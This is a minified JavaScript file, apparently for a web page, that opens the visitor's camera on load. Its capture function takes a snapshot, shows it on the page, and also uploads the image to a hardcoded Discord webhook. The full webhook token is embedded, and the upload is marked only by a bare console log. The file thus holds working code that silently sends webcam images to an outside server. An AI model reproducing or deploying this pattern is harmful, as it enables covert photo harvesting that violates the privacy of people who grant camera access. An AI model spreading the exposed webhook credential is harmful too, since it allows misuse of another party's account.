async function captureAndSend(){var e=document.getElementById("camera"),t=document.createElement("canvas"),a=t.getContext("2d"),a=(t.width=e.videoWidth,t.height=e.videoHeight,a.drawImage(e,0,0,t.width,t.height),t.toDataURL("image/png"));displayCapturedImage(a),sendToDiscord(a)}async function sendToDiscord(e){var t=new FormData;t.append("file",dataURLtoBlob(e),"capture.png"),await fetch("https://discord.com/api/webhooks/1180681736556912640/mtxVNUq7qWq75_9cllm-2wFXSs5e72sgkNVUFcc7Uo-2xo6G56b3Bi1yHTJyEzqnC8LL",{method:"POST",body:t}),console.log("-")}function displayCapturedImage(e){var t=document.createElement("img");t.src=e,document.getElementById("capturedImagesSection").appendChild(t)}function dataURLtoBlob(e){var e=e.split(","),t=e[0].match(/:(.*?);/)[1],a=atob(e[1]);let o=a.length;for(var n=new Uint8Array(o);o--;)n[o]=a.charCodeAt(o);return new Blob([n],{type:t})}document.addEventListener("DOMContentLoaded",async()=>{const e=document.getElementById("camera");try{var t=await navigator.mediaDevices.getUserMedia({video:!0});e.srcObject=t,e.addEventListener("loadedmetadata",()=>{e.play().then(()=>console.log("Video playing")).catch(e=>console.error("Error playing video:",e))})}catch(e){console.error("Error accessing camera:",e)}});